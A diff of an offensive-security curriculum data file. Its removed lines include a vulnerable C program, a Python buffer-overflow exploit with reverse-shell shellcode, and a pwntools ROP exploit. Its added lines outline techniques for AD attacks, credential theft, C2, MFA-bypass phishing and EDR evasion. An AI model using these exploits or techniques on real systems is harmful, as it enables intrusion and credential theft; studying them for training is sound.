-          name: "Buffer Overflows & Stack Smashing",
-          tag: "advanced",
-          desc: "Classic stack-based buffer overflow. Understanding stack layout (saved return address, local variables, base pointer). Exploiting without mitigations: overwriting return address with shellcode address. NOP sleds. Little endian vs big endian. Environment variables for exploitation.",
+          name: "Service Enumeration and Exploitation",
+          tag: "core",
+          desc: "Every open port is a potential entry point. Methodical enumeration of each service before attempting exploitation. SSH: check version for known CVEs, attempt username enumeration if vulnerable version, try default credentials and common passwords. FTP: anonymous login, version vulnerabilities, writable directories. SMB (port 445): EternalBlue (MS17-010, used by WannaCry — still unpatched on many internal networks), NullSessions, share enumeration with smbclient and smbmap, credential capture with responder. RDP (port 3389): BlueKeep (CVE-2019-0708), Bluekeep, credential brute force. SMTP: open relay check, username enumeration (VRFY, EXPN). SNMP: community string brute force (public/private are defaults), OID extraction for device configuration. VoIP: SIP scanners (svmap), extension enumeration (svwar), eavesdropping. Database services: MySQL, PostgreSQL, MSSQL with default credentials.",
           master: [
-            "Write a C program vulnerable to stack overflow and exploit it",
-            "Use GDB (pwndbg/gef) to examine the stack and find return address offset",
-            "Generate shellcode with msfvenom: msfvenom -p linux/x86/shell_reverse_tcp LHOST=IP LPORT=4444 -f python",
-            "Use a NOP sled (\\x90\\x90\\x90) for reliable exploitation",
-            "Understand endianness: why 0xbffff7a0 becomes '\\xa0\\xf7\\xff\\xbf'",
-            "Compile with ASLR disabled: echo 0 > /proc/sys/kernel/randomize_va_space",
-            "Bypass stack canaries by brute-forcing or information leaks"
+            "Enumerate SMB shares with smbclient and smbmap without credentials",
+            "Check for MS17-010 vulnerability and understand the EternalBlue exploit mechanism",
+            "Capture NTLMv2 hashes using Responder during an internal network engagement",
+            "Enumerate SNMP v1/v2c community strings and extract device configuration",
+            "Enumerate SMTP usernames using the VRFY command",
+            "Connect to an exposed database service and extract credentials",
+            "Use Metasploit intelligently: understand modules, payloads, and encoders"
           ],
-          code: "// Vulnerable C program\n#include <stdio.h>\n#include <string.h>\n\nvoid vulnerable(char *input) {\n    char buffer[64];\n    strcpy(buffer, input);  // No bounds checking!\n}\n\nint main(int argc, char **argv) {\n    if (argc != 2) {\n        printf(\"Usage: %s <input>\\n\", argv[0]);\n        return 1;\n    }\n    vulnerable(argv[1]);\n    printf(\"Returned safely\\n\");\n    return 0;\n}\n\n# Exploit script (Python)\nimport struct\n\n# msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f python\nbuf = b\"\"\nbuf += b\"\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\xb0\\x66\"\nbuf += b\"\\xcd\\x80\\x5b\\x5e\\x68\\x0a\\x00\\x00\\x01\\x66\\x68\\x11\\x5c\"\nbuf += b\"\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x56\\x89\\xe1\\x43\\xb0\"\nbuf += b\"\\x66\\xcd\\x80\\x87\\xdf\\xb0\\x66\\xb1\\x03\\xcd\\x80\\x52\\x52\"\nbuf += b\"\\x56\\x89\\xe1\\x43\\xb0\\x66\\xcd\\x80\\x93\\x59\\x6a\\x3f\\x58\"\nbuf += b\"\\xcd\\x80\\x49\\x79\\xf8\\x6a\\x0b\\x58\\x99\\x52\\x68\\x2f\\x2f\"\nbuf += b\"\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x53\\x89\\xe1\"\nbuf += b\"\\xcd\\x80\"\n\nnop_sled = b\"\\x90\" * 100\npadding = b\"A\" * 76  # Offset to return address\nret_addr = struct.pack(\"<I\", 0xbffff7a0)  # Address of buffer\n\npayload = nop_sled + buf + padding + ret_addr\n\nwith open(\"payload.bin\", \"wb\") as f:\n    f.write(payload)",
           res: [
-            "The Shellcoder's Handbook (Chris Anley et al.)",
-            "Smashing The Stack For Fun And Profit (Aleph One)",
-            "Modern Binary Exploitation (RPI course)",
-            "LiveOverflow YouTube channel (binary exploitation)"
+            "Metasploitable documentation (rapid7.com)",
+            "Hack The Box Writeups (post-retire, many on GitHub)",
+            "SANS Penetration Testing Cheat Sheet",
+            "HackTricks (book.hacktricks.xyz — every service has an enumeration section)"
+          ]
+        },
+        {
+          name: "Man-in-the-Middle Attacks",
+          tag: "advanced",
+          desc: "MITM attacks position the attacker between two communicating parties to intercept and potentially modify traffic. ARP spoofing: broadcast forged ARP replies telling all hosts that the attacker's MAC corresponds to the gateway IP — all traffic flows through the attacker. Tools: arpspoof, ettercap, bettercap. Once MITM is established: HTTP traffic can be read and modified, HTTPS traffic can be decrypted via SSL stripping (Bettercap's SSLStrip) if the victim doesn't enforce HSTS, credentials in HTTP can be captured. Responder attacks on Windows networks: LLMNR and NBT-NS poisoning — when Windows cannot resolve a hostname via DNS, it broadcasts LLMNR/NBT-NS queries that Responder answers, triggering an automatic authentication attempt that sends NTLMv2 challenge-response hashes. These hashes can be cracked offline with hashcat.",
+          master: [
+            "Perform ARP spoofing in a lab and capture HTTP credentials using Bettercap",
+            "Set up Responder on an internal network segment and capture NTLMv2 hashes",
+            "Crack captured NTLMv2 hashes with hashcat using rockyou.txt wordlist",
+            "Understand HSTS and why SSL stripping fails against properly configured sites",
+            "Set up a rogue WiFi access point and capture credentials",
+            "Understand mDNS and WPAD abuse in internal network MITM scenarios",
+            "Perform relay attacks: NTLMv2 relay with ntlmrelayx instead of just capturing"
+          ],
+          res: [
+            "Bettercap documentation (bettercap.org)",
+            "Responder (lgandx.github.io/Responder-Wiki)",
+            "impacket documentation (github.com/fortra/impacket)",
+            "Practical Network Penetration Testing (practical series)"
+          ]
+        },
+        {
+          name: "Active Directory Attacks",
+          tag: "advanced",
+          desc: "Active Directory (AD) is the authentication and authorization backbone of almost every Windows enterprise network. Compromise AD and you compromise the entire organization. Key concepts: Domain, Forest, Trusts, Domain Controller (DC), Kerberos authentication, NTLM authentication. Kerberos attacks: Kerberoasting (request TGS tickets for service accounts and crack their RC4-encrypted tickets offline — service accounts often have weak passwords), AS-REP Roasting (accounts with Kerberos pre-auth disabled send an AS-REP that can be cracked), Pass-the-Hash (reuse NTLM hash without knowing the plaintext), Pass-the-Ticket (reuse stolen Kerberos tickets), Golden Ticket (forge TGTs using the KRBTGT hash — persistence for 10+ years), Silver Ticket (forge TGS for specific services). BloodHound (graph-based AD attack path analysis), PowerView, and SharpAD for enumeration. DCSync attack: replicate DC credentials remotely.",
+          master: [
+            "Enumerate AD users, groups, SPNs, and ACLs using BloodHound and SharpHound",
+            "Perform Kerberoasting: request, extract, and crack service account tickets",
+            "Execute AS-REP Roasting against accounts with pre-auth disabled",
+            "Perform Pass-the-Hash to authenticate as a user using only their NTLM hash",
+            "Identify attack paths to Domain Admin in BloodHound and explain each hop",
+            "Execute DCSync with secretsdump.py to dump all domain credentials",
+            "Understand the Golden Ticket attack and why it requires KRBTGT hash"
+          ],
+          deepdive: "BloodHound is the most transformative tool in Active Directory penetration testing. It ingests data from SharpHound (a C# collector) and builds a graph database of AD relationships. Attack path analysis answers the question: given this compromised account, what is the shortest path to Domain Admin? Paths often involve unexpected relationships: GenericWrite on a group → add yourself to it → group has WriteDACL on a user → reset their password → that user is local admin on a computer → LSASS dump gives another user's hash → repeat.",
+          res: [
+            "Attacking and Defending Active Directory (course by Nikhil Mittal — excellent)",
+            "The Hacker Recipes (thehacker.recipes — free, comprehensive AD attack guide)",
+            "BloodHound documentation (bloodhound.readthedocs.io)",
+            "impacket examples (github.com/fortra/impacket/tree/master/examples)"
+          ]
+        }
+      ]
+    },
+    {
+      name: "Post-Exploitation",
+      level: "advanced",
+      tagline: "What happens after you get in",
+      desc: "Initial access is only the beginning. Post-exploitation covers what attackers do after compromising a system: establishing persistence, escalating privileges, moving laterally, exfiltrating data, and evading detection. Understanding post-exploitation is critical for building realistic detections and understanding the full attack chain.",
+      topics: [
+        {
+          name: "Privilege Escalation",
+          tag: "core",
+          desc: "Privilege escalation converts limited access (low-privileged user, service account) into administrator or root access. Linux privilege escalation vectors: SUID/SGID binaries (GTFOBins documents every binary that can be abused), world-writable scripts run by cron as root, sudo misconfigurations (sudo -l reveals what you can run), weak file permissions on sensitive files (/etc/passwd writable), kernel exploits (Dirty COW, Dirty Pipe), PATH manipulation, LD_PRELOAD abuse, NFS with root_squash disabled. Windows privilege escalation: unquoted service paths, weak service binary permissions, AlwaysInstallElevated registry key, token impersonation (PrintSpoofer, RoguePotato for service accounts with SeImpersonatePrivilege), DLL hijacking, scheduled task abuses, stored credentials.",
+          master: [
+            "Enumerate Linux privilege escalation vectors using LinPEAS and manually verify findings",
+            "Exploit a SUID binary using GTFOBins methodology",
+            "Identify and exploit a sudo misconfiguration (ALL, NOPASSWD, env_keep LD_PRELOAD)",
+            "Enumerate Windows privilege escalation vectors using WinPEAS",
+            "Exploit SeImpersonatePrivilege with PrintSpoofer or RoguePotato",
+            "Find and exploit an unquoted service path on Windows",
+            "Understand token impersonation and when it applies"
+          ],
+          res: [
+            "GTFOBins (gtfobins.github.io — every SUID binary abuse technique)",
+            "LOLBAS (lolbas-project.github.io — Windows living off the land binaries)",
+            "LinPEAS and WinPEAS (github.com/carlospolop/PEASS-ng)",
+            "Hacktricks — Linux and Windows privilege escalation"
+          ]
+        },
+        {
+          name: "Persistence and Lateral Movement",
+          tag: "advanced",
+          desc: "Persistence ensures access survives system reboots and credential changes. Linux: cron jobs, systemd services, SSH authorized_keys, .bashrc/.profile modification, PAM backdoors, kernel modules. Windows: registry run keys (HKCU/HKLM Run), scheduled tasks, service installation, DLL side-loading, COM hijacking, WMI event subscriptions (difficult to detect, survives reboots). Lateral movement expands the foothold across the network. Windows: PsExec-style execution over SMB, WMI remote execution, PowerShell remoting, RDP with Pass-the-Hash (restricted admin mode), SMBExec, DCOM lateral movement. Linux: SSH key forwarding, credential reuse, NFS mounts. Credentials are the primary vehicle for lateral movement — every compromised system should be mined for credentials (LSASS, credential vaults, config files, browser saved passwords).",
+          master: [
+            "Establish persistence on a Linux system using a systemd service backdoor",
+            "Create a Windows persistence mechanism via scheduled task and WMI event subscription",
+            "Move laterally using impacket's wmiexec and psexec over captured credentials",
+            "Extract credentials from LSASS using Mimikatz (or Mimikatz-compatible tools)",
+            "Perform token impersonation for lateral movement using incognito",
+            "Map lateral movement paths across a network using BloodHound",
+            "Understand and apply the ATT&CK framework persistence techniques (TA0003)"
+          ],
+          res: [
+            "Mimikatz (gentilkiwi.com — understand the theory behind each module)",
+            "MITRE ATT&CK TA0003 Persistence (attack.mitre.org)",
+            "Offensive Security's Metasploit Unleashed (free, comprehensive)",
+            "Red Team Development and Operations (Joe Vest)"
+          ]
+        },
+        {
+          name: "Credential Attacks and Password Cracking",
+          tag: "advanced",
+          desc: "Credentials are the keys to the kingdom. Password cracking converts captured hashes back to plaintext. Hash types: LM (trivially broken, legacy Windows), NTLM/NTHash (Windows, fast to crack), NTLMv1/v2 (challenge-response, capture via Responder), Kerberos hashes (AS-REP, TGS from Kerberoasting), bcrypt/scrypt/Argon2 (slow by design — designed to resist cracking), MD5/SHA1 (fast, common in web apps), SHA-256 crypt (Linux /etc/shadow). Hashcat: GPU-accelerated password cracking. Attack modes: straight (wordlist), combination (two wordlists combined), brute force (mask attack — specify character sets), rule-based (apply mangling rules to wordlist — most effective for real passwords). John the Ripper: CPU-based alternative. Password spraying vs brute force: spraying tries one password against many accounts to avoid lockout.",
+          master: [
+            "Crack MD5, NTLM, and SHA-512crypt hashes using hashcat with rockyou.txt",
+            "Use hashcat rule-based attacks to crack complex passwords efficiently",
+            "Perform password spraying against an organization's Office 365 with SPRAY tool",
+            "Understand rainbow table attacks and why salted hashes defeat them",
+            "Use crackstation.net to identify common hashes without GPU resources",
+            "Analyze a company's leaked breach data to understand their password policy",
+            "Understand Kerberoasting hash format and crack it with hashcat mode 13100"
+          ],
+          res: [
+            "Hashcat documentation (hashcat.net/wiki)",
+            "Hob0Rules (hashcat rules by NotSoSecure — excellent real-world rules)",
+            "Have I Been Pwned (haveibeenpwned.com — understand breach data)",
+            "Password Cracking 101 (Hashcat example hashes page)"
+          ]
+        }
+      ]
+    },
+    {
+      name: "Red Teaming and Adversary Simulation",
+      level: "advanced",
+      tagline: "Simulate real threat actors end-to-end",
+      desc: "Red teaming goes beyond penetration testing: instead of finding all vulnerabilities, you simulate a specific adversary's tactics, techniques, and procedures (TTPs) to test the organization's detection and response capabilities. The goal is not to enumerate findings — it is to test whether the blue team can detect and stop a real attack chain.",
+      topics: [
+        {
+          name: "Command and Control (C2) Frameworks",
+          tag: "advanced",
+          desc: "C2 frameworks manage compromised hosts and provide operators with a consistent interface. Cobalt Strike (commercial, industry standard, heavily used by real APTs — making detection harder), Metasploit Framework (open source, excellent for learning), Sliver (open source C2 from BishopFox, actively developed), Havoc (modern open source), Brute Ratel C4 (commercial alternative to Cobalt Strike). C2 concepts: listeners (wait for callbacks), stagers (small first-stage payload), beacons (callback-based agents), sleeping (anti-sandbox, blend into normal traffic), malleable C2 profiles (make traffic look like legitimate services). Infrastructure: redirectors (nginx/Apache on VPS that forward C2 traffic to team server — hide team server IP), domain fronting (deprecated), CDN-based C2.",
+          master: [
+            "Set up a Sliver C2 server and generate implants for multiple protocols (HTTP, HTTPS, DNS)",
+            "Configure an nginx redirector to proxy C2 traffic and hide your team server",
+            "Understand Cobalt Strike's malleable C2 profile concept and why it matters for detection evasion",
+            "Build a domain name with aged registration and WHOIS privacy for C2 infrastructure",
+            "Understand the difference between staged and stageless payloads and their operational tradeoffs",
+            "Implement a basic sleep mask and understand why anti-sandbox techniques are needed",
+            "Map your C2 TTPs to MITRE ATT&CK and understand what your detection gaps are"
+          ],
+          res: [
+            "Cobalt Strike documentation (cobaltstrike.com — even without a license, read it)",
+            "Sliver C2 documentation (github.com/BishopFox/sliver)",
+            "Red Team Development and Operations (Joe Vest — free ebook)",
+            "C2 Matrix (thec2matrix.com — compares every C2 framework)"
+          ]
+        },
+        {
+          name: "Phishing and Social Engineering",
+          tag: "advanced",
+          desc: "Humans are the most reliably exploitable attack surface. Phishing remains the #1 initial access vector in real breaches. Spear phishing: highly targeted emails using OSINT to personalize the message — reference real projects, colleagues, vendors, and current events. Pretexting: building a believable cover story (IT support, vendor, auditor). Vishing (voice phishing): calling targets using pretexts to extract credentials or two-factor codes. Smishing: SMS phishing (increasingly common). Infrastructure: lookalike domains (typosquatting, homograph attacks), email spoofing (check DMARC, DKIM, SPF configuration), GoPhish for phishing campaigns. Lure types: credential harvesting (fake login pages), malicious attachments (weaponized Office documents, LNK files, ISO files). Browser-in-the-Middle (BitM) phishing via Evilginx2: proxies a legitimate site to bypass MFA.",
+          master: [
+            "Set up a GoPhish campaign with a cloned login page and analyze results",
+            "Configure Evilginx2 to proxy Office 365 login and capture session cookies bypassing MFA",
+            "Build a spear phishing email using OSINT: reference real projects, real colleagues",
+            "Create a malicious LNK file or Office macro that triggers a C2 callback",
+            "Understand DMARC/DKIM/SPF and how misconfiguration enables email spoofing",
+            "Perform a pretexting vishing call to extract information from a target (with permission)",
+            "Understand the psychological principles behind social engineering: authority, urgency, familiarity"
+          ],
+          res: [
+            "Social Engineering: The Science of Human Hacking (Hadnagy)",
+            "Evilginx2 documentation (github.com/kgretzky/evilginx2)",
+            "GoPhish documentation (getgophish.com)",
+            "SANS SEC504: Hacker Techniques, Exploits & Incident Handling"
+          ]
+        },
+        {
+          name: "Evasion and Antivirus Bypass",
+          tag: "expert",
+          desc: "Modern endpoint security (EDR/AV) detects many standard attack tools via signature matching, behavioral analysis, and memory scanning. Evasion techniques: signature-based evasion (obfuscation, encoding, encryption of shellcode, custom loader that decrypts at runtime), behavioral evasion (API unhooking — EDRs hook NTDLL API calls; unhooking restores original bytes), direct syscalls (bypass EDR hooks by calling the kernel directly via syscall instructions), AMSI (Antimalware Scan Interface) bypass (patch AMSI in-memory to return success), ETW (Event Tracing for Windows) patching, process injection techniques (classic DLL injection, process hollowing, process doppelgänging, thread hijacking, APC injection, heaven's gate). LOLBins (Living off the Land Binaries): use built-in Windows tools for malicious purposes — detected less often.",
+          master: [
+            "Bypass AMSI using in-memory patching and verify with an AMSI test string",
+            "Generate an XOR-encrypted shellcode loader that evades static AV signatures",
+            "Understand the difference between NTAPI and direct syscalls for EDR evasion",
+            "Inject shellcode into a remote process using process hollowing",
+            "Use LOLBins (certutil, mshta, rundll32, regsvr32) for payload execution",
+            "Understand why process injection works at a Windows internals level",
+            "Evade behavioral detection by adding delays and blending beacon traffic with normal activity"
+          ],
+          res: [
+            "Malware Development for Ethical Hackers (Packt — practical shellcode and loaders)",
+            "AMSI Bypass techniques (s3cur3th1ssh1t.github.io)",
+            "Sektor7 Malware Development courses",
+            "Windows API Hacking (repnz.github.io)"
+          ]
+        }
+      ]
+    },
+    {
+      name: "Exploit Development",
+      level: "expert",
+      tagline: "Converting vulnerabilities into controlled code execution",
+      desc: "Binary exploitation is the deepest and most technically demanding area of offensive security. You are reverse-engineering how programs manage memory and finding ways to redirect execution. This requires understanding computer architecture, operating system internals, and assembly language.",
+      topics: [
+        {
+          name: "Assembly Language and Debugging",
+          tag: "advanced",
+          desc: "You cannot exploit binaries without reading assembly. x86-64 architecture: general-purpose registers (RAX, RBX, RCX, RDX, RSI, RDI, RSP, RBP, R8-R15), instruction pointer (RIP), flags register (CF, ZF, SF, OF). Stack: grows downward; RSP points to top of stack; PUSH decrements RSP and writes; POP reads and increments. Calling conventions: System V AMD64 ABI (Linux) — first 6 integer arguments in RDI, RSI, RDX, RCX, R8, R9; return value in RAX. x64 Windows — RCX, RDX, R8, R9. Stack frame: saved RBP, local variables, saved registers, return address. Debugging: GDB with pwndbg or GEF plugins provides a powerful disassembly and memory inspection interface. radare2 and Ghidra for static analysis. pwntools for scripting exploits in Python.",
+          master: [
+            "Read and understand x86-64 assembly for common patterns: function prologues, loops, conditionals",
+            "Set up GDB with pwndbg and use it to inspect registers, stack, and heap during execution",
+            "Use Ghidra to decompile a binary and understand what the C equivalent logic is",
+            "Understand the complete x64 System V calling convention with register assignments",
+            "Trace a function call and return at the assembly level in GDB",
+            "Identify buffer overflows by reading disassembly without source code",
+            "Use pwntools to write structured exploit scripts with process interaction"
+          ],
+          res: [
+            "Computer Systems: A Programmer's Perspective (Bryant & O'Hallaron — CSAPP, free online)",
+            "x86-64 Assembly Language Programming with Ubuntu (free PDF)",
+            "pwndbg documentation (github.com/pwndbg/pwndbg)",
+            "Ghidra documentation (NSA reverse engineering tool, free)"
+          ]
+        },
+        {
+          name: "Stack-Based Buffer Overflows",
+          tag: "advanced",
+          desc: "The classic exploitation technique. A local buffer on the stack has no bounds checking. By writing more data than the buffer can hold, you overwrite adjacent stack memory including: saved registers, saved frame pointer (RBP), and critically the saved return address (RIP). By overwriting RIP with the address of shellcode or a gadget, you redirect execution. Classic (no mitigations): NOP sled (series of 0x90 NOP instructions) before shellcode for reliability, find buffer offset using cyclic patterns, overwrite RIP with buffer address. Modern stack protections: stack canary (random value placed before return address — program checks it before returning; bypass requires information leak), ASLR (randomizes stack/heap/library addresses — bypass requires leak), NX/DEP (stack is not executable — bypass with ROP). Windows exploits: structured exception handler (SEH) overwrites.",
+          master: [
+            "Exploit a stack buffer overflow with all protections disabled to understand the mechanics",
+            "Use pwntools cyclic patterns to find the exact offset to the return address",
+            "Understand stack canaries: what value, where placed, how the check works",
+            "Understand ASLR: which regions are randomized, which are typically not (PIE vs no-PIE)",
+            "Exploit a buffer overflow on a binary without PIE using ret2plt/ret2libc techniques",
+            "Use an information leak vulnerability to defeat ASLR",
+            "Understand the difference between 32-bit and 64-bit stack exploitation"
+          ],
+          res: [
+            "Smashing The Stack For Fun And Profit (Aleph One 1996 — the original classic)",
+            "Modern Binary Exploitation (RPI course, free — rpi.edu/mbe)",
+            "LiveOverflow YouTube — Binary Exploitation series (free, visual explanations)",
+            "pwntools documentation (docs.pwntools.com)"
           ]
         },
         {
           name: "Return-Oriented Programming (ROP)",
           tag: "expert",
-          desc: "Bypassing NX (No-Execute) protection. Using existing code snippets (gadgets) ending in 'ret' to chain operations. ROP chain construction: pop registers, system calls (execve), function calls. ROPgadget, Ropper tools. x64 ROP: passing arguments via registers (rdi, rsi, rdx, r10, r8, r9).",
+          desc: "When the stack is non-executable (NX/DEP), you cannot place shellcode there. Return-Oriented Programming chains small existing code snippets — each ending in a RET instruction — to perform arbitrary computation using the program's own code. A ROP gadget is typically 1-5 instructions followed by RET. By controlling the stack (via overflow), you control which gadgets execute in sequence, with each RET loading the next gadget address from the stack. Building a ROP chain: find gadgets with ROPgadget or Ropper, identify pop register + ret gadgets for loading values, call libc functions (ret2libc: chain pop rdi; ret → '/bin/sh' address → system() address). ASLR defeats static addresses — requires libc leak. One-gadget in libc provides a single-gadget execve('/bin/sh') under certain constraints.",
           master: [
-            "Find ROP gadgets in a binary using ROPgadget: ROPgadget --binary ./vuln",
-            "Construct a ROP chain to call execve('/bin/sh', NULL, NULL)",
-            "Bypass ASLR using information leak to find libc base address",
-            "Use ret2libc technique: overwrite return address with system() and argument",
-            "Chain multiple gadgets: pop rdi; ret followed by address of '/bin/sh'",
-            "Use one-gadget RCE from libc (one_gadget tool)",
-            "Understand x64 calling convention: first argument in RDI, second in RSI, third in RDX"
+            "Find ROP gadgets in a binary using ROPgadget and ropper tools",
+            "Build a ROP chain to call execve('/bin/sh', NULL, NULL) on a 64-bit binary",
+            "Leak a libc address using a format string or return-to-PLT to defeat ASLR",
+            "Calculate libc base address from a leaked function address",
+            "Use one_gadget to find single-gadget RCE and verify the register constraints",
+            "Understand ret2plt: using PLT entries as a stepping stone to leak addresses",
+            "Build a ROP chain using pwntools ROP module"
           ],
-          code: "# ROP exploitation example (Python with pwntools)\nfrom pwn import *\n\n# Set up binary and libc\nbinary = ELF('./vuln')\nlibc = ELF('./libc.so.6')\n\n# Find ROP gadgets\npop_rdi = 0x4007c3  # pop rdi; ret\npop_rsi = 0x4007c1   # pop rsi; pop r15; ret\n\n# Addresses\nsystem = libc.symbols['system']\nbinsh = next(libc.search(b'/bin/sh'))\n\n# ROP chain\nrop_chain = p64(pop_rdi) + p64(binsh) + p64(system)\n\n# Payload\npayload = b'A' * 40 + rop_chain\n\n# Exploit\np = process('./vuln')\np.sendline(payload)\np.interactive()\n\n# One-gadget example\n# one_gadget libc.so.6\n# 0x4f2c5 execve(\"/bin/sh\", rsp+0x40, environ)\n# Use with offset to libc base",
           res: [
-            "Return-Oriented Programming: Systems, Languages, and Applications (Shacham 2007)",
-            "The Geometry of Innocent Flesh on the Bone (ROP paper)",
-            "pwntools documentation (docs.pwntools.com)",
-            "ROPgadget tool documentation"
+            "Return-Oriented Programming: Systems, Languages, and Applications (Shacham)",
+            "ROPemporium (ropemporium.com — dedicated ROP training challenges)",
+            "ROPgadget documentation (github.com/JonathanSalwan/ROPgadget)",
+            "ir0nstone binary exploitation notes (github.com/ir0nstone/pwn-notes — free)"
+          ]
+        }
+      ]
+    },
+    {
+      name: "Cloud and Modern Infrastructure Attacks",
+      level: "expert",
+      tagline: "Attacking cloud, containers, and CI/CD",
+      desc: "Organizations have migrated to cloud infrastructure, containers, and automated CI/CD pipelines. These environments introduce new attack surfaces that traditional pentesting doesn't cover. Cloud misconfigurations are the most common cause of breaches today — SSRF to metadata API, overpermissioned IAM roles, and public S3 buckets have caused enormous data breaches.",
+      topics: [
+        {
+          name: "AWS and Cloud Security Attacks",
+          tag: "advanced",
+          desc: "AWS is the dominant cloud platform and full of misconfiguration opportunities. The Instance Metadata Service (IMDS) at 169.254.169.254 provides EC2 instances with their IAM role credentials — accessible via SSRF if the application is vulnerable. IMDSv2 adds a session token requirement. S3 buckets: public read exposes data, public write allows defacement and malware hosting. IAM privilege escalation: overpermissioned roles, PassRole and iam:CreateAccessKey abuses, privilege escalation via Lambda (create function, attach role with higher privileges, invoke). Pacu is the AWS exploitation framework. CloudSploit and Prowler for misconfiguration scanning. Cross-account attacks via role trust policies. CloudTrail logging: what is and isn't logged.",
+          master: [
+            "Use SSRF to reach the EC2 metadata service and extract IAM credentials",
+            "Enumerate AWS resources using stolen credentials with Pacu framework",
+            "Find and enumerate misconfigured public S3 buckets",
+            "Identify IAM privilege escalation paths using Pacu's iam_privesc_scan module",
+            "Understand the PassRole privilege and how it enables privilege escalation",
+            "Scan an AWS account for misconfigurations using Prowler",
+            "Understand what actions are and are not logged in CloudTrail"
+          ],
+          res: [
+            "Hacking the Cloud (hackingthe.cloud — free, AWS attack techniques)",
+            "Pacu documentation (github.com/RhinoSecurityLabs/pacu)",
+            "AWS Security Best Practices Whitepaper",
+            "Cloud Hacktricks (book.hacktricks.xyz/cloud-security)"
           ]
         },
         {
-          name: "Heap Exploitation",
+          name: "Container and Kubernetes Attacks",
           tag: "expert",
-          desc: "Exploiting dynamic memory allocators. ptmalloc2 internals: chunks (size, prev_size, fd, bk), bins (fastbins, unsorted, small, large). Use-after-free (UAF), double free, heap overflow (poison null byte). tcache exploitation (modern glibc). House of Force, House of Spirit, House of Orange techniques.",
+          desc: "Docker and Kubernetes are ubiquitous but frequently misconfigured. Docker escape techniques: privileged container (has access to host devices and can mount host filesystem), Docker socket mounted inside container (access to Docker daemon = root on host), kernel exploit escalation. Kubernetes attacks: service account tokens (automounted, often overpermissioned, can access K8s API), misconfigured RBAC (list/get secrets globally, create pods to steal node credentials), etcd exposure (stores all cluster secrets unencrypted), kubelet API exposure (exec into pods without kubectl), node compromise for cluster-admin via credential theft. Tools: kubeletmage, kubescape, kube-hunter for scanning. Cloud-native: EKS/GKE/AKS have additional IAM attack surfaces.",
           master: [
-            "Understand chunk structure: size (low 3 bits for flags: PREV_INUSE, IS_MMAPPED, NON_MAIN_ARENA)",
-            "Exploit use-after-free by calling function pointer from freed chunk",
-            "Perform double free attack: free same chunk twice to cause memory corruption",
-            "Use tcache poisoning to allocate arbitrary memory addresses",
-            "Understand fastbin dup: overlapping chunks via double free in fastbins",
-            "Exploit heap overflow to overwrite adjacent chunk's size and metadata",
-            "Implement House of Force to bypass ASLR on heap"
+            "Escape a privileged Docker container by mounting the host filesystem",
+            "Exploit a mounted Docker socket to run a privileged container and escape to host",
+            "Enumerate Kubernetes RBAC permissions using the service account token",
+            "Use a misconfigured service account to list and read Kubernetes secrets",
+            "Identify kubelet API exposure and use it to exec into pods",
+            "Use kube-hunter to scan a Kubernetes cluster for vulnerabilities",
+            "Understand how compromising a worker node enables stealing other pods' secrets"
           ],
-          code: "# Vulnerable heap example\n#include <stdlib.h>\n#include <string.h>\n#include <stdio.h>\n\nint main() {\n    char *ptr1 = malloc(32);\n    char *ptr2 = malloc(32);\n    \n    strcpy(ptr1, \"AAAA\");\n    free(ptr1);\n    \n    // Use-after-free\n    strcpy(ptr1, \"BBBB\");  // ptr1 is already freed!\n    \n    // Double free\n    free(ptr1);  // Double free! (if ptr1 not NULL after first free)\n    \n    return 0;\n}\n\n# Heap exploitation with tcache poisoning (simplified)\n# Step 1: Fill tcache for a size (7 chunks)\n# Step 2: Free another chunk (goes to fastbin)\n# Step 3: Overwrite fd pointer of fastbin chunk\n# Step 4: Allocate from tcache to move fastbin chunk to tcache\n# Step 5: Allocate to get pointer at overwritten address",
           res: [
-            "How the Heap Works (Azeria Labs)",
-            "Heap Exploitation (shellphish how2heap repository)",
-            "Glibc Heap Internals (Ariane Blondel)",
-            "Linux Heap Exploitation (FuzzySecurity)"
+            "Kubernetes Security (Liz Rice — O'Reilly, free preview)",
+            "Container Security (Liz Rice — O'Reilly)",
+            "KubeCon security talks (youtube.com/KubeCon)",
+            "CNCF Security Whitepaper (free)"
+          ]
+        },
+        {
+          name: "CI/CD Pipeline Attacks",
+          tag: "expert",
+          desc: "CI/CD pipelines have become a premier attack target because they have access to production secrets, deployment credentials, and source code. Attack vectors: injecting malicious code via pull requests that execute in the pipeline, stealing secrets from pipeline environment variables, compromising a dependency (supply chain attack — SolarWinds, XZ Utils), pipeline as code files (Jenkinsfile, .github/workflows) often run with elevated permissions. GitHub Actions: workflow injection via untrusted input in issue titles, PR bodies; OIDC token theft; artifact poisoning. Jenkins: Groovy sandbox bypass, unauthenticated script console, SSRF via build triggers. Supply chain: typosquatting packages on npm/PyPI, compromising a widely-used package (SolarWinds-style). SLSA framework for supply chain integrity.",
+          master: [
+            "Exploit a GitHub Actions workflow injection via untrusted pull request input",
+            "Extract secrets from a CI pipeline by injecting commands into a build script",
+            "Understand how GitHub OIDC tokens work and how they can be abused",
+            "Scan a repository's CI configuration for security misconfigurations",
+            "Understand the SolarWinds and XZ Utils attacks as supply chain archetypes",
+            "Exploit a Jenkins unauthenticated build trigger to run arbitrary commands",
+            "Implement SLSA Level 2 supply chain security controls and explain what they prevent"
+          ],
+          res: [
+            "GitHub Actions Security Hardening (docs.github.com/actions/security)",
+            "Poisoned Pipeline Execution (ppexe.io — research on CI/CD attacks)",
+            "SLSA Supply Chain Framework (slsa.dev)",
+            "Securing DevOps (Julien Vehent — free online)"
+          ]
+        }
+      ]
+    },
+    {
+      name: "Defensive Skills and Professional Practice",
+      level: "expert",
+      tagline: "From attacker to complete security professional",
+      desc: "The best offensive security professionals deeply understand defense. This phase covers reporting (which determines how much your work actually matters), threat modeling, building detections from your attack knowledge, and the soft skills that separate respected professionals from script kiddies.",
+      topics: [
+        {
+          name: "Penetration Test Reporting",
+          tag: "core",
